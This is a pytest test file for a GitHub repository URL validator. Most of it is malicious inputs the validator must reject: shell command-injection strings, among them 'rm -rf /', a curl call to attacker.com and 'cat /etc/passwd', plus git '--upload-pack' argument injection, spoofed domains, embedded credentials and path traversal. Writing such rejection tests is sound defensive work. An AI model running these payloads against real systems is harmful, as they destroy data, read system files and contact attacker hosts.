"""Unit tests for strict GitHub repository URL validation and malicious input rejection."""

import pytest
from app.ingestion.clone import InvalidRepositoryURLError, validate_github_url


def test_valid_github_urls():
    """Verify that standard, public HTTPS github.com URLs pass validation and normalize."""
    test_cases = [
        ("https://github.com/fastapi/fastapi", "https://github.com/fastapi/fastapi.git"),
        ("https://github.com/facebook/react.git", "https://github.com/facebook/react.git"),
        ("https://github.com/owner-123/my_repo-app.git/", "https://github.com/owner-123/my_repo-app.git"),
        ("https://github.com/yashaskn8/RepoLens", "https://github.com/yashaskn8/RepoLens.git"),
    ]
    for raw_url, expected in test_cases:
        assert validate_github_url(raw_url) == expected


def test_reject_non_https_schemes():
    """Verify that non-HTTPS schemes are rejected."""
    invalid_schemes = [
        "http://github.com/owner/repo",
        "git://github.com/owner/repo.git",
        "ssh://git@github.com/owner/repo.git",
        "git@github.com:owner/repo.git",
        "file:///etc/passwd",
        "ftp://github.com/owner/repo",
    ]
    for url in invalid_schemes:
        with pytest.raises(InvalidRepositoryURLError):
            validate_github_url(url)


def test_reject_other_domains_and_spoofs():
    """Verify that non-github.com hosts or spoofed domains are rejected."""
    invalid_domains = [
        "https://gitlab.com/owner/repo",
        "https://bitbucket.org/owner/repo",
        "https://evil-github.com/owner/repo",
        "https://github.com.evil.com/owner/repo",
        "https://notgithub.com/owner/repo",
    ]
    for url in invalid_domains:
        with pytest.raises(InvalidRepositoryURLError):
            validate_github_url(url)


def test_reject_credentials_in_url():
    """Verify that embedded basic-auth credentials in URLs are strictly rejected."""
    credentials_urls = [
        "https://user:password@github.com/owner/repo",
        "https://token@github.com/owner/repo",
        "https://x-access-token:ghp_12345@github.com/owner/repo",
    ]
    for url in credentials_urls:
        with pytest.raises(InvalidRepositoryURLError) as exc_info:
            validate_github_url(url)
        assert "Credentials in repository URLs are strictly prohibited" in str(exc_info.value)


def test_reject_command_injection_and_metacharacters():
    """Verify that shell metacharacters and command injection payloads are rejected."""
    malicious_urls = [
        "https://github.com/owner/repo; rm -rf /",
        "https://github.com/owner/repo && curl http://attacker.com",
        "https://github.com/owner/repo | cat /etc/passwd",
        "https://github.com/owner/`whoami`",
        "https://github.com/owner/$(id)",
        "https://github.com/owner/repo\n--upload-pack=evil",
        "--upload-pack=evil",
        "-u",
    ]
    for url in malicious_urls:
        with pytest.raises(InvalidRepositoryURLError):
            validate_github_url(url)


def test_reject_path_traversal():
    """Verify that path traversal in owner/repo names is rejected."""
    traversal_urls = [
        "https://github.com/../repo",
        "https://github.com/owner/..",
        "https://github.com/./repo",
    ]
    for url in traversal_urls:
        with pytest.raises(InvalidRepositoryURLError):
            validate_github_url(url)
